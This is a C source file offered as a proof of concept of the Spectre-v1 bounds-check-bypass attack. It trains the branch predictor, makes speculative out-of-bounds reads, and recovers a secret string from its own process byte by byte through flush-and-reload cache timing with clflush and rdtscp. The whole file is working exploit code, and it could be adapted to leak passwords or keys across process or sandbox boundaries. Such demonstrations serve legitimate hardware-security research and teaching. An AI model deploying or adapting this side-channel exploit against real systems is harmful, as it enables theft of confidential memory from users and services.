#include <stdio.h>
#include <stdint.h> 
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif
#define L1_BLOCK_SZ_BYTES   64
#define TRAIN_TIMES         1023    // the predictor in SonicBoom is much more sophisticated, need more training
#define ROUNDS              1    // run the train + attack sequence X amount of times (for redundancy)
#define ATTACK_SAME_ROUNDS  10   // amount of times to attack the same index
#define SECRET_SZ           19
#define CACHE_HIT_THRESHOLD 79

uint64_t array1_sz = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
char*   secretString = "PASSWORD_SPECTRE_V1";

void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray) {
    outValArray[0] = 0; outValArray[1] = 0;
    for (uint64_t i = 0; i < inArraySize; ++i) {
        if (inArray[i] > outValArray[0]) {
            outValArray[1] = outValArray[0]; outValArray[0] = inArray[i];
            outIdxArray[1] = outIdxArray[0]; outIdxArray[0] = i;
        }
        else if (inArray[i] > outValArray[1]) {
            outValArray[1] = inArray[i]; outIdxArray[1] = i;
        }
    }
}

uint8_t temp = 0;
void victimFunc(uint64_t idx) {
    _mm_clflush(&array1_sz);
    if (idx < array1_sz) {
        temp &= array2[array1[idx] * L1_BLOCK_SZ_BYTES];
    }
}

int main(void) {
    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
    uint64_t start, diff, passInIdx, randIdx;
    uint8_t dummy = 0;
    static uint64_t results[256];

    printf("This is a POC of Spectre-v1 (Branch Condition Check Bypass)\n");
    printf("the secret key is:%s \n", secretString);

    for(uint64_t len = 0; len < SECRET_SZ; ++len) {
        for(uint64_t i = 0; i < 256; ++i) results[i] = 0;
        int junk = 0;
        register uint64_t time1, time2;
        volatile uint8_t *addr;

        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound) {
            // flushCache((uint64_t)array2, sizeof(array2)); // make sure array you read from is not in the cache
            // Flush array2[256*(0..255)] from cache
            for (int tt =0; tt <256; tt++){
                _mm_clflush(&array2[tt * L1_BLOCK_SZ_BYTES]);
            }

            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j) {
                randIdx = atkRound % array1_sz;
                passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
                passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
                passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx   
                for(uint64_t k = 0; k < 10; ++k) asm(""); // set of constant takens to make the BHR be in a all taken state
                // call function to train or attack
                victimFunc(passInIdx);
            }
            
            // read out array 2 and see the hit secret value
            // this is also assuming there is no prefetching
            for(uint64_t i = 0; i < 256; ++i) {
                uint64_t  uiTemp = 0;  //introduced a dummy variable to prevent compiler optimizations
                addr = &array2[i * L1_BLOCK_SZ_BYTES];
                time1 = __rdtscp(&junk);
                junk = *addr;
                time2 = __rdtscp(&junk) - time1;
                if(time2 < CACHE_HIT_THRESHOLD){
                    results[i] += 1;
                }
                // start = rdcycle();
                // dummy &= array2[i * L1_BLOCK_SZ_BYTES];
                // diff = (rdcycle() - start);
                // if (diff < CACHE_HIT_THRESHOLD) results[i] += 1;
            }
        }
        
        // get highest and second highest result hit values
        uint8_t output[2] = {0, 0};
        uint64_t hitArray[2] = {0, 0};
        topTwoIdx(results, 256, output, hitArray);

        if(output[0] == (int)secretString[len] || output[1] == (int)secretString[len]) 
        printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
                                                           hitArray[1], output[1], output[1]); 
        else 
        printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
                                                           hitArray[1], output[1], output[1]);  

        
        ++attackIdx; // read in the next secret 
    }

    return 0;
}
